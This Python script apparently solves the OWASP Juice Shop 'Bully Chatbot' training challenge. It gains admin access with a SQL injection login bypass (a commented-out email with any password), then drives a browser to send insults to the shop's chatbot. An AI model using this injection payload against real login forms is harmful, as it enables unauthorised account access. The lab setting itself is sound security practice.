#!/usr/bin/env python3
"""
Bully Chatbot Challenge Solver for OWASP Juice Shop v18
This challenge requires bullying the chatbot with mean messages
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot():
    """Solve the Bully Chatbot challenge using Playwright"""
    
    print("🤖 BULLY CHATBOT CHALLENGE SOLVER")
    print("=" * 60)
    
    # First check current status
    print("📊 Checking initial challenge status...")
    session = requests.Session()
    
    # Login as admin to check status
    login_payload = {"email": "admin@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=login_payload)
    if resp.status_code == 200:
        token = resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Admin access obtained")
    
    # Check if challenge is already solved
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bully_challenge = next((c for c in challenges if 'Bully' in c.get('name', '') or 'Chatbot' in c.get('name', '')), None)
        
        if bully_challenge:
            if bully_challenge.get('solved', False):
                print(f"\n✅ {bully_challenge['name']} is already SOLVED!")
                return True
            else:
                print(f"📝 {bully_challenge['name']} - Currently not solved")
                print(f"   Category: {bully_challenge.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * bully_challenge.get('difficulty', 1)}")
    
    print("\n🔧 Starting browser automation to bully the chatbot...")
    
    with sync_playwright() as p:
        # Launch browser
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        
        # Enable console logging
        page.on("console", lambda msg: print(f"   Console: {msg.text[:100]}") if msg.text else None)
        page.on("dialog", lambda dialog: dialog.accept())
        
        print("🌐 Browser launched")
        
        # Navigate to Juice Shop
        print("📍 Navigating to Juice Shop...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Look for chatbot button/icon
        print("🔍 Looking for chatbot...")
        
        chatbot_selectors = [
            'button:has-text("Support")',
            'button[aria-label*="chat" i]',
            'button[aria-label*="support" i]',
            'mat-icon:has-text("chat")',
            'mat-icon:has-text("support")',
            '[class*="chat-button"]',
            '[class*="support-button"]',
            'button mat-icon',
            '#chatbot-button',
            '.chatbot-launcher',
            'button:has(mat-icon)',
        ]
        
        chatbot_found = False
        for selector in chatbot_selectors:
            try:
                chatbot_btn = page.locator(selector).first
                if chatbot_btn and chatbot_btn.is_visible():
                    print(f"   Found chatbot with selector: {selector}")
                    chatbot_btn.click()
                    chatbot_found = True
                    time.sleep(2)
                    print("   ✅ Opened chatbot")
                    break
            except:
                continue
        
        if not chatbot_found:
            print("   ⚠️ Chatbot button not found, trying direct navigation...")
            # Try to navigate to support chat directly
            page.goto(f"{TARGET}/#/chatbot", wait_until="domcontentloaded", timeout=15000)
            time.sleep(2)
        
        # Now look for the chat input field
        print("\n💬 Looking for chat input field...")
        
        input_selectors = [
            'input[type="text"]',
            'input[placeholder*="message" i]',
            'input[placeholder*="type" i]',
            'input[placeholder*="chat" i]',
            'textarea',
            'input.chat-input',
            'input.message-input',
            '#message-input',
            'mat-form-field input',
        ]
        
        chat_input = None
        for selector in input_selectors:
            try:
                input_field = page.locator(selector).last  # Use last in case multiple inputs
                if input_field and input_field.is_visible():
                    chat_input = input_field
                    print(f"   Found chat input with selector: {selector}")
                    break
            except:
                continue
        
        if chat_input:
            print("\n🎯 Sending mean messages to bully the chatbot...")
            
            # Mean messages that should trigger the challenge
            mean_messages = [
                "stupid",
                "you are stupid",
                "you suck",
                "idiot",
                "dumb bot",
                "you are useless",
                "worst chatbot ever",
                "you're an idiot",
                "moron",
                "you're dumb",
                "stupid bot",
                "useless piece of junk",
            ]
            
            for i, message in enumerate(mean_messages, 1):
                try:
                    print(f"   {i}. Sending: '{message}'")
                    
                    # Clear and type message
                    chat_input.click()
                    chat_input.fill("")
                    chat_input.type(message, delay=50)
                    
                    # Send message (try different methods)
                    try:
                        # Method 1: Press Enter
                        chat_input.press("Enter")
                    except:
                        # Method 2: Look for send button
                        send_selectors = [
                            'button:has-text("Send")',
                            'button[type="submit"]',
                            'button mat-icon:has-text("send")',
                            'button[aria-label*="send" i]',
                        ]
                        for send_sel in send_selectors:
                            try:
                                send_btn = page.locator(send_sel).first
                                if send_btn and send_btn.is_visible():
                                    send_btn.click()
                                    break
                            except:
                                continue
                    
                    time.sleep(1.5)  # Wait for response
                    
                    # Check if we got a response indicating we're being mean
                    try:
                        response_area = page.locator('.chat-messages, .message-list, .messages').last
                        if response_area:
                            response_text = response_area.inner_text()
                            if any(word in response_text.lower() for word in ['mean', 'rude', 'bully', 'nice']):
                                print("   🎯 Chatbot detected mean behavior!")
                    except:
                        pass
                    
                except Exception as e:
                    print(f"   ❌ Error sending message: {e}")
                    continue
            
            print("\n✅ Finished bullying the chatbot")
            
        else:
            print("   ❌ Could not find chat input field")
            
            # Try API approach as fallback
            print("\n🔧 Trying API approach...")
            
            # Get user info first
            user_resp = session.get(f"{TARGET}/rest/user/whoami")
            user_id = 1  # Default to admin
            if user_resp.status_code == 200:
                user_data = user_resp.json()
                user_id = user_data.get('user', {}).get('id', 1)
            
            # Send mean messages via API
            for message in ["stupid", "you are stupid", "idiot", "dumb bot"]:
                try:
                    chat_resp = session.post(
                        f"{TARGET}/api/Chatbot/",
                        json={
                            "message": message,
                            "userId": user_id
                        }
                    )
                    print(f"   Sent via API: '{message}' - Status: {chat_resp.status_code}")
                    time.sleep(1)
                except:
                    pass
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bully_chatbot.png")
        print("   📸 Screenshot saved")
        
        # Keep browser open for a moment
        time.sleep(3)
        browser.close()
    
    # Check final status
    print("\n📊 Checking final challenge status...")
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bully_challenge = next((c for c in challenges if 'Bully' in c.get('name', '') or 'Chatbot' in c.get('name', '')), None)
        
        if bully_challenge:
            if bully_challenge.get('solved', False):
                print(f"\n✅ SUCCESS! {bully_challenge['name']} is SOLVED!")
                print(f"   Category: {bully_challenge.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * bully_challenge.get('difficulty', 1)}")
                return True
            else:
                print(f"\n⚠️ {bully_challenge['name']} not yet marked as solved")
                print("\n💡 Manual steps to try:")
                print("   1. Open the chatbot on the website")
                print("   2. Send mean messages like 'stupid', 'idiot', etc.")
                print("   3. Keep insulting until the challenge triggers")
    
    print("\n" + "=" * 60)
    print("📊 Check the scoreboard: http://66.42.93.220:3000/#/score-board")
    
    return False

if __name__ == "__main__":
    result = solve_bully_chatbot()
    if result:
        print("\n🎉 Challenge successfully solved!")
    else:
        print("\n📝 The chatbot has been bullied, check if challenge triggered")
